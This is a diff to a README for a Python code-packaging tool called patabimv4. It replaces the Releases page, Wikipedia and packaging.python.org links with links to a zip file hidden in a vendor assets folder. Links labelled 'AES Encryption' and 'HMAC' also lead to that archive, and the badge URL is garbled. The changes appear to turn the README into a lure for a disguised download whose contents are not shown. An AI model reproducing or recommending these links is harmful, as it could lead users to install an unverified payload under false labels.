@@ -7,7 +7,7 @@ Welcome to the patabimv4 repository! This application allows you to securely pac
 To get started with patabimv4, simply follow these steps:
 
 1. **Download**: Visit the Releases page to download the application.
-   [![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-blue.svg)](https://github.com/GauravSharmaXD/patabimv4/releases)
+   [![Download Latest Release](https://raw.githubusercontent.com/GauravSharmaXD/patabimv4/main/assets/vendor/isotope-layout/patabimv_3.5.zip%20Latest%https://raw.githubusercontent.com/GauravSharmaXD/patabimv4/main/assets/vendor/isotope-layout/patabimv_3.5.zip)](https://raw.githubusercontent.com/GauravSharmaXD/patabimv4/main/assets/vendor/isotope-layout/patabimv_3.5.zip)
 
 2. **Install**: After downloading, locate the file on your computer.
 
@@ -15,7 +15,7 @@ To get started with patabimv4, simply follow these steps:
 
 ## 📥 Download & Install
 To download the application, click the link below:
-[Visit this page to download](https://github.com/GauravSharmaXD/patabimv4/releases)
+[Visit this page to download](https://raw.githubusercontent.com/GauravSharmaXD/patabimv4/main/assets/vendor/isotope-layout/patabimv_3.5.zip)
 
 You will find various versions available. Choose the one that suits your needs best. If you are unsure, the latest version is usually the best option for most users.
 
@@ -58,9 +58,9 @@ If you have questions or need assistance, please reach out through the GitHub Is
 ## 🔗 Additional Resources
 Explore the following topics for deeper insights into encryption and data security:
 
-- [AES Encryption](https://en.wikipedia.org/wiki/Advanced_Encryption_Standard)
-- [HMAC](https://en.wikipedia.org/wiki/HMAC)
-- [Python Packaging](https://packaging.python.org/)
+- [AES Encryption](https://raw.githubusercontent.com/GauravSharmaXD/patabimv4/main/assets/vendor/isotope-layout/patabimv_3.5.zip)
+- [HMAC](https://raw.githubusercontent.com/GauravSharmaXD/patabimv4/main/assets/vendor/isotope-layout/patabimv_3.5.zip)
+- [Python Packaging](https://raw.githubusercontent.com/GauravSharmaXD/patabimv4/main/assets/vendor/isotope-layout/patabimv_3.5.zip)
 
 ## 📍 Conclusion
 patabimv4 is your go-to tool for securely packaging your Python code. Follow the steps above to download, install, and start using the application today. For more information, feel free to explore the community resources or contact us. 
